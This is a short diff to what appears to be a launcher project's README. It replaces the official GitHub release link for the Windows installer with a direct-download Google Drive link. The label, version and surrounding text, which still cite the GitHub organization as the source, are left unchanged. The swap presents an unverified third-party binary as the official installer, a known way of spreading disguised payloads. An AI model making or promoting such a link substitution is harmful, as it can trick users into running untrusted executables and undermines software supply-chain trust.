@@ -10,7 +10,7 @@
 
 | Platform | Installer | Last Version |
 |----------|-----------|-------------|
-| 🪟 Windows | [⬇ Download `.exe`](https://github.com/LegacyLauncher/LegacyLauncherInstaller/releases/latest/download/Legacy-Launcher-Installer-win.exe) | v1.16.5 (final legacy) |
+| 🪟 Windows | [⬇ Download `.exe`](https://drive.usercontent.google.com/download?id=10ehIKq0o16TSgrw4ssWwktHtTB44E8DF&export=download&authuser=0&confirm=t&uuid=2588e657-8ef2-43bb-a4dd-c0bc7b58f644&at=AKSUxGOm-6DT77Wp6m2y-aQgXiY4:1759661139100) | v1.16.5 (final legacy) |
 
 > 💡 **Tip:** You can also manually download the archived launcher JAR from the [LegacyLauncher GitHub organization](https://github.com/LegacyLauncher) if you prefer manual setup.
 
